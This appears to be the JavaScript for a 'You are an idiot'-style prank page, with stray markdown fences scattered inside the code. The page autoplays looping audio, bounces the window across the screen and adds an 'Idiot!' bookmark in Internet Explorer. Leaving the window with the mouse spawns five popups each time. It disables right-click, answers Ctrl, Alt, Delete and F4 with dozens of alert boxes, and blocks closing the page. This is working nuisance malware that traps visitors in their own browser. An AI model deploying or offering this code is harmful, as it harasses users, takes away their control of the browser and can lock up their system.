/* Audio playback and looping */

var audioStarted = false;

function musicPlay() {
var audio = document.getElementById('youare-audio');
var micon = document.getElementById('youare-micon');

```
if (!audio) return;

if (audio.paused) {
    audio.play().then(function () {
        audioStarted = true;
        if (micon) micon.src = "images/speaker.png";
    }).catch(function (error) {
        console.warn("Audio playback blocked:", error);
    });
} else {
    audio.pause();
    audio.currentTime = 0;
    audioStarted = false;

    if (micon) micon.src = "images/speakerm.png";
}
```

}

function startAudio() {
var audio = document.getElementById('youare-audio');
var micon = document.getElementById('youare-micon');

```
if (!audio) {
    console.error("Audio element #youare-audio not found.");
    return;
}

audio.loop = true;
audio.volume = 1;

audio.play().then(function () {
    audioStarted = true;
    if (micon) micon.src = "images/speaker.png";
}).catch(function (error) {
    console.warn("Autoplay blocked by browser:", error);
});
```

}

document.addEventListener('DOMContentLoaded', startAudio);

window.addEventListener('load', startAudio);


function bookmark() {
if ((navigator.appName == "Microsoft Internet Explorer") &&
(parseInt(navigator.appVersion) >= 4)) {
var url = "lol.html";
var title = "Idiot!";

```
    window.external.AddFavorite(url, title);
}
```

}

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function changeTitle(title) {
document.title = title;
}

function openWindow(url) {
window.open(
url,
"_blank",
'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes'
);
}

function proCreate() {
for (var i = 0; i < 5; i++) {
openWindow('lol.html');
}
}

function newXlt() {
xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
window.focus();
}

function newXrt() {
xOff = Math.ceil(7 * Math.random()) * 5 - 10;
window.focus();
}

function newYup() {
yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
window.focus();
}

function newYdn() {
yOff = Math.ceil(7 * Math.random()) * 5 - 10;
window.focus();
}

function fOff() {
flagRun = 0;
}

function playBall() {
xPos += xOff;
yPos += yOff;

```
if (xPos > screen.width - 357) newXlt();
if (xPos < 0) newXrt();

if (yPos > screen.height - 330) newYup();
if (yPos < 0) newYdn();

if (flagRun == 1) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
}
```

}

window.onload = function () {
flagRun = 1;

```
playBall();
bookmark();

return true;
```

};

window.onmouseout = function () {
proCreate();
return null;
};

window.oncontextmenu = function () {
return false;
};

window.onkeydown = function (event) {
var keyCode = event.keyCode;

```
if (keyCode == 17 || keyCode == 18 ||
    keyCode == 46 || keyCode == 115) {

    for (var i = 0; i < 22; i++) {
        alert("UwU");
    }

    for (var i = 0; i < 10; i++) {
        alert("You dumb?????!");
    }

    alert("!");
    alert("!");
    alert("!");

    proCreate();
}

return null;
```

};

window.onbeforeunload = function () {
return "UwU";
};

/* [Oct 2021] End of amendments. */
